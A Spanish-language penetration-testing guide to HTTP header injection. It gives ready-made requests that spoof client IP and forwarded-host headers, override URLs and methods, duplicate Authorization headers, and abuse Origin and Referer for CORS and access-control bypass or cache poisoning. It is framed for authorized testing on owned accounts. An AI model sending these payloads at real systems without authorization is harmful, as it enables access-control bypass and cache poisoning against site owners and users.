# 🗡️ Header injection: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### IP declarada por cabeceras de proxy

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

**Cuándo usarlo:** Añadir una cabecera por solicitud de prueba. Solo hay impacto si una decisión protegida cambia; una página que muestra la IP declarada no basta.

**Fuente:** [PortSwigger](https://portswigger.net/kb/issues/00400110_spoofable-client-ip-address).


### Cabecera inocua de propagación

```http
X-Prueba: prueba-123
X-Request-ID: canary-{NONCE}
```

**Cuándo usarlo:** Una por solicitud. Sirve para localizar reflexión o propagación entre capas, no constituye por sí sola inyección explotable.

**Fuente:** [PortSwigger](https://portswigger.net/kb/issues/00200200_http-response-header-injection).


## 🧭 Payloads por contexto

### Esquema y host reenviados

```http
X-Forwarded-Proto: http
X-Forwarded-Host: {CONTROLLED_HOST}
Forwarded: proto=http;host={CONTROLLED_HOST}
```

**Cuándo usarlo:** Probar por separado y comparar URL generada/Location bajo el mismo host de conexión. Solo confiar en estos campos desde proxies autenticados.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).


### Ruta reescrita por cabecera

```http
X-Original-URL: /ruta-canary-{NONCE}
X-Rewrite-URL: /ruta-canary-{NONCE}
```

**Cuándo usarlo:** Una cabecera por request a una ruta propia. Requiere demostrar que edge y backend discrepan sobre la ruta usada para autorización.

**Fuente:** [PortSwigger](https://portswigger.net/kb/issues/00400f00_request-url-override).


## 🔥 Payloads avanzados

### Cabecera sin clave de caché

```http
X-Forwarded-Host: canary-{NONCE}.{CONTROLLED_HOST}
X-Host: canary-{NONCE}.{CONTROLLED_HOST}
```

**Cuándo usarlo:** En una URL privada de prueba, verificar reflexión y después HIT/MISS para la misma clave. No contaminar recursos compartidos.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws).


## 🔬 Pruebas guiadas por escenario

### 1. X-Forwarded-For no confiable

**Objetivo:** Comparar una request propia con y sin cabecera; no usar el valor para atribuir IP real.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
X-Forwarded-For: 192.0.2.123
```

**Interpretación:** Solo es hallazgo si cambia una decisión de seguridad, por ejemplo rate limit o acceso.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 2. Forwarded estandarizada

**Objetivo:** Algunas pilas confían en `Forwarded` en vez de X-Forwarded-*.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
Forwarded: for=192.0.2.123;proto=https;host={CONTROLLED_HOST}
```

**Interpretación:** Verificar qué componente consume cada parámetro; un eco en logs no es bypass.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 3. X-Forwarded-Proto

**Objetivo:** Comprobar si una cabecera cliente cambia redirecciones o cookies seguras.

```http
GET /login HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Proto: http
```

**Interpretación:** Comparar Location y Set-Cookie en una sesión propia; proxy puede sobrescribirla.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 4. X-Original-URL

**Objetivo:** Ruta de prueba bajo control propio; buscar routing alterno de reverse proxy.

```http
GET / HTTP/1.1
Host: {ORIGEN}
X-Original-URL: /api/test-owned
```

**Interpretación:** Un cambio de ruta demuestra reescritura; autorización indebida requiere prueba adicional.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control).

### 5. X-Rewrite-URL

**Objetivo:** Variante documentada de override de URL.

```http
GET / HTTP/1.1
Host: {ORIGEN}
X-Rewrite-URL: /api/test-owned
```

**Interpretación:** Comparar con request directa y confirmar que no es redirección del cliente.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control).

### 6. Cabecera duplicada de autorización

**Objetivo:** Solo con tokens propios A y B para observar precedencia entre capas.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Authorization: Bearer {TOKEN_B}
```

**Interpretación:** Muchos servidores rechazan duplicados; una identidad inesperada requiere demostrar cuál parser eligió cada valor.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 7. X-HTTP-Method-Override

**Objetivo:** Solo con una operación reversible sobre un objeto propio; comparar método reconocido por proxy y aplicación.

```http
POST /api/test-owned HTTP/1.1
Host: {ORIGEN}
X-HTTP-Method-Override: PUT
Content-Type: application/json

{"name":"prueba-123"}
```

**Interpretación:** Diferencia de autorización entre proxy y aplicación requiere evidencia de la operación aplicada; revertir el cambio.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management/06-HTTP_Methods/).

### 8. Origin controlado para política CORS

**Objetivo:** Solo cuenta de prueba en un endpoint privado; origen HTTPS propio.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
Origin: https://{CONTROLLED_HOST}
```

**Interpretación:** La lectura cruzada requiere ACAO exacto, ACAC true y cookies realmente enviadas; validar en navegador.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cors).

### 9. Referer usado como autorización

**Objetivo:** Solicitud de prueba que normalmente devuelve 403; no alterar datos de terceros.

```http
GET /api/test-owned HTTP/1.1
Host: {ORIGEN}
Referer: https://{ORIGEN}/admin/
```

**Interpretación:** Un 200 por sí solo es insuficiente; demostrar que una función propia bloqueada se habilita solo por Referer.

**Fuente técnica:** [PortSwigger](https://portswigger.net/kb/issues/00400100_referer-dependent-response).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
